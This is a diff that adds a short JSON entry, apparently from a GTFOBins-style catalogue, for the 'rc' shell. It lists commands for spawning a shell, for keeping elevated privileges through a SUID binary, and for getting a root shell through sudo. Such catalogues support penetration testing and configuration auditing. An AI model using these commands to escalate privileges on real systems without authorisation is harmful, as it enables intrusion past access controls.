@@ -1,0 +1,22 @@
+{
+  "functions": {
+    "shell": [
+      {
+        
+        "code": "rc -c '/bin/sh'\n"
+      }
+    ],
+    "suid": [
+      {
+        
+        "code": "./rc -c '/bin/sh -p'\n"
+      }
+    ],
+    "sudo": [
+      {
+        
+        "code": "sudo rc -c '/bin/sh'\n"
+      }
+    ]
+  }
+}
